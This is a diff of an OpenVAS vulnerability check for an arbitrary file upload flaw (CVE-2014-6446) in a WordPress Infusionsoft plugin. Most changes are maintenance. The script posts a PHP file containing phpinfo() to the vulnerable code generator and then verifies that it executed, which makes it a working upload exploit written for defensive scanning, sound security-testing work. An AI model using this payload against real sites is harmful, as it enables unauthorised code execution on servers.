@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wp_infusionsoft_gravity_forms_file_upload_vuln.nasl 11402 2018-09-15 09:13:36Z cfischer $
+# $Id: gb_wp_infusionsoft_gravity_forms_file_upload_vuln.nasl 11497 2018-09-20 10:31:54Z mmartin $
 #
 # Wordpress Infusionsoft Gravity Forms Add-on Arbitrary File Upload Vulnerability
 #
@@ -29,11 +29,11 @@ CPE = "cpe:/a:wordpress:wordpress";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.804769");
-  script_version("$Revision: 11402 $");
+  script_version("$Revision: 11497 $");
   script_cve_id("CVE-2014-6446");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-15 11:13:36 +0200 (Sat, 15 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-20 12:31:54 +0200 (Thu, 20 Sep 2018) $");
   script_tag(name:"creation_date", value:"2014-09-29 17:24:16 +0530 (Mon, 29 Sep 2014)");
 
   script_name("Wordpress Infusionsoft Gravity Forms Add-on Arbitrary File Upload Vulnerability");
@@ -74,6 +74,7 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
+include("misc_func.inc");
 
 if(!http_port = get_app_port(cpe:CPE)){
   exit(0);
@@ -84,6 +85,7 @@ if(!dir = get_app_location(cpe:CPE, port:http_port)){
 }
 
 url = dir + '/wp-content/plugins/infusionsoft/Infusionsoft/utilities/code_generator.php';
+vtstring = get_vt_string();
 
 wpReq = http_get(item: url,  port:http_port);
 wpRes = http_keepalive_send_recv(port:http_port, data:wpReq, bodyonly:TRUE);
@@ -91,7 +93,7 @@ wpRes = http_keepalive_send_recv(port:http_port, data:wpReq, bodyonly:TRUE);
 if(">Code Generator<" >< wpRes &&
    "tool will generate a file based on the information you put" >< wpRes)
 {
-  fileName = 'OpenVAS_' + rand() + '.php';
+  fileName = vtstring + '_' + rand() + '.php';
 
   postData = string('fileNamePattern=out%2F', fileName,
                     '&fileTemplate=%3C%3Fphp+phpinfo%28%29%3B+unlink%28+%22',
@@ -114,7 +116,7 @@ if(">Code Generator<" >< wpRes &&
        pattern:">phpinfo\(\)<", extra_check:">PHP Documentation<"))
     {
       if(http_vuln_check(port:http_port, url:url,
-         check_header:FALSE, pattern:"HTTP/1.. 404"))
+         check_header:FALSE, pattern:"^HTTP/1\.[01] 404"))
       {
         security_message(http_port);
         exit(0);
